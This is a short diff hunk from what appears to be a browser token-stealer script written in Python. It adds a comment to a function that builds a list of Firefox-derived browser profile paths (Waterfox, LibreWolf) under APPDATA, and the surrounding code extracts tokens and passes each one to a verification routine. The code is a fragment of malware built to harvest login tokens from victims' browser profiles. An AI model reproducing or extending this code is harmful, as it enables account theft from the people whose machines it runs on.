@@ -268,7 +268,7 @@ def firefox():
                                 for token in toks:
                                     verifytks(token)
     
-    def othertks():
+    def othertks(): #idek if this works because i havent tried it
         otherffbrowsers = {
         'Waterfox': os.getenv("APPDATA") + "\\Waterfox\\Profiles\\",
         'Librewolf': os.getenv("APPDATA") + "\\LibreWolf\\Profiles\\",
